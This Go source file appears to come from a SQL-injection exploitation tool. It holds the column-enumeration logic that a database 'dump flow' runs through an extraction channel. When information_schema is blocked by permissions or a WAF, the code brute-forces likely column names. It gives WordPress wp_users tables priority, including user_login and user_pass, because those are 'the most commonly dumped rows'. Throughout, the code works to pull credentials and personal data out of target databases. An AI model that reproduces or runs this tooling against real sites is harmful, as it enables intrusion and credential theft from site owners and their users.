package enumeration

import (
	"context"
	"strings"
)

// commonColumnNames are the conventional, framework-planted column names tried
// as a last resort when information_schema is entirely unreachable.
var commonColumnNames = []string{
	"id", "uid", "user_id", "user", "username", "login", "user_login",
	"pass", "password", "pwd", "user_pass", "email", "mail", "user_email",
	"name", "first_name", "last_name", "role", "admin", "is_admin",
	"status", "active", "created_at", "updated_at", "token", "api_key",
	"phone", "mobile", "address", "value", "data",
}

// wpUserColumnNames are the fixed wp_users table layout WordPress drops, tried
// before brute-forcing the generic list so the most common leaked table still
// resolves cheaply.
var wpUserColumnNames = []string{
	"ID", "user_login", "user_pass", "user_nicename", "user_email",
	"user_url", "user_registered", "user_activation_key", "user_status",
	"display_name",
}

// isWPUsersTable reports whether the table name looks like a WordPress users
// table (wp_users / wp_user / wpuser / users variants).
func isWPUsersTable(table string) bool {
	t := strings.ToLower(strings.TrimSpace(table))
	for _, cand := range []string{"wp_users", "wp_user", "wpuser", "users", "user"} {
		if t == cand {
			return true
		}
	}
	return false
}

// resolveColumnSet returns the column set for a resolved table by walking the
//   full fail-safe chain used by the dump flow:
//
//  1. information_schema.columns scoped by schema AND table (per-DBMS query).
//  2. information_schema.columns scoped by table name only (schema filter
//     dropped), covering hosts where the schema name differs from the one the
//     operator passed or where the schema itself is not readable.
//  3. Brute-forcing well-known column names when schema access is blocked.
//
// Step 1 and Step 2 only consider a retry meaningful when the query *engine*
// is working but produced no columns, so a hard extraction error does not
// silently cascade into an expensive brute-force scan.
func (e *Enumerator) resolveColumnSet(ctx context.Context, database, table string) ([]Column, error) {
	// Step 1: schema + table scoped. A hard extraction error on the catalogue
	// query means information_schema is restricted (permission denied / WAF /
	// zero readable rows). Do NOT abort the dump for that — record a log notice
	// and fall through to the schema-agnostic probe and the default-column maps.
	cols, err := e.listColumnsRaw(ctx, database, table)
	if err != nil {
		e.progressf("[*] information_schema restricted (%v). Falling back to direct column probing & default schema maps...", err)
		cols = nil
	} else if len(cols) == 0 {
		e.progressf("[*] information_schema returned no columns. Falling back to direct column probing & default schema maps...")
	}
	if len(cols) > 0 {
		return cols, nil
	}

	// Step 2: schema-agnostic (table-only) lookup.
	if q := e.columnsByTableOnly(table); q != "" {
		if rows, qerr := e.ext.ExtractRows(ctx, q, 1); qerr == nil && len(rows) > 0 {
			out := make([]Column, 0, len(rows))
			for _, r := range rows {
				if len(r) > 0 && r[0] != "" {
					out = append(out, Column{Name: r[0]})
				}
			}
			if len(out) > 0 {
				e.progressf("[columns] schema filter returned nothing; used table-only lookup for %s", table)
				return out, nil
			}
		}
	}

	// Step 3a: WordPress wp_users layout before the generic brute force, as
	// WordPress identities are the most commonly dumped rows.
	if isWPUsersTable(table) {
		if wp := e.bruteForceColumns(ctx, database, table, wpUserColumnNames); len(wp) > 0 {
			e.progressf("[columns] schema access blocked; detected wp_users table, used %d known WordPress column(s)", len(wp))
			return wp, nil
		}
	}

	// Step 3b: brute-force common columns (schema fully blocked).
	if bf := e.bruteForceColumns(ctx, database, table, commonColumnNames); len(bf) > 0 {
		e.progressf("[columns] schema access blocked; brute-forced %d common column(s)", len(bf))
		return bf, nil
	}

	// Step 4: schema is entirely unreachable. If the table is a WordPress
	// identity table we already know its canonical layout, so drop it in
	// verbatim as a best-effort default map rather than returning nothing —
	// this lets the dump proceed across the error channel for the single most
	// common "blocked schema" target (wp_users). For arbitrary tables we fall
	// back to the conventional column dictionary so a concatenated dump can
	// still be attempted.
	e.progressf("[columns] no live column probe succeeded; using default %s schema map for %s", defaultMapName(table), table)
	if isWPUsersTable(table) {
		return wpColumns(wpUserColumnNames), nil
	}
	return wpColumns(commonColumnNames), nil
}

// wpColumns wraps names into a Column slice.
func wpColumns(names []string) []Column {
	out := make([]Column, 0, len(names))
	for _, n := range names {
		out = append(out, Column{Name: n})
	}
	return out
}

// defaultMapName returns a short label describing which default column map will
// be used for a blocked-schema table.
func defaultMapName(table string) string {
	if isWPUsersTable(table) {
		return "WordPress wp_users"
	}
	return "common-column dictionary"
}

// columnsByTableOnly builds a schema-agnostic column query for the backend
// where information_schema / the catalogue allows it, or "" when unsupported.
func (e *Enumerator) columnsByTableOnly(table string) string {
	if e.queries == nil {
		return ""
	}
	switch e.queries.Name {
	case "mysql", "postgres":
		return "SELECT column_name FROM information_schema.columns WHERE table_name='" + table + "' ORDER BY ORDINAL_POSITION"
	case "mssql":
		return "SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='" + table + "'"
	case "oracle":
		return "SELECT column_name FROM all_tab_columns WHERE table_name='" + strings.ToUpper(table) + "' ORDER BY column_id"
	case "sqlite":
		return "SELECT name FROM pragma_table_info('" + table + "')"
	default:
		return ""
	}
}

// bruteForceColumns tests the candidate column names against the table and
// returns the queryable ones. It runs only as a last resort and is bounded so
// a table with none of the candidates does not turn into a long scan.
func (e *Enumerator) bruteForceColumns(ctx context.Context, database, table string, candidates []string) []Column {
	var out []Column
	for _, col := range candidates {
		if ctx.Err() != nil {
			break
		}
		if !e.columnExists(ctx, database, table, col) {
			continue
		}
		out = append(out, Column{Name: col})
		if len(out) >= 8 {
			break
		}
	}
	return out
}

// columnExists reports whether `col` is selectable from `table`. It uses a
// count query; a non-existent column surfaces as a query/parse failure.
func (e *Enumerator) columnExists(ctx context.Context, database, table, col string) bool {
	if e.queries == nil {
		return false
	}
	expr := "SELECT count(" + col + ") FROM " + e.tableRef(database, table)
	_, err := e.ext.ExtractInt(ctx, expr)
	return err == nil
}

func (e *Enumerator) tableRef(database, table string) string {
	q := e.queries
	qid := q.QuoteIdent
	if qid == nil {
		qid = func(s string) string { return s }
	}
	if database != "" {
		return qid(database) + "." + qid(table)
	}
	return qid(table)
}
